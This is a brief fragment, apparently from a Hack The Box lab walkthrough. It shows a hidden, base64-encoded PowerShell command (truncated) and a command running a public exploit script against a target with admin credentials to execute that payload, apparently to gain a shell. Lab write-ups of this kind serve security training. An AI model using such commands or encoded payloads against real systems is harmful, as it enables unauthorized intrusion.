...
powershell.exe -nop -w hidden -e WwBOA...KQApADsA
...
```bash
$ python3 49488.py -u admin@htb.local -p baconandcheese -i http://$TARGET/ -c powershell -a '-nop -w hidden -e WwBOA...KQApADsA'
```
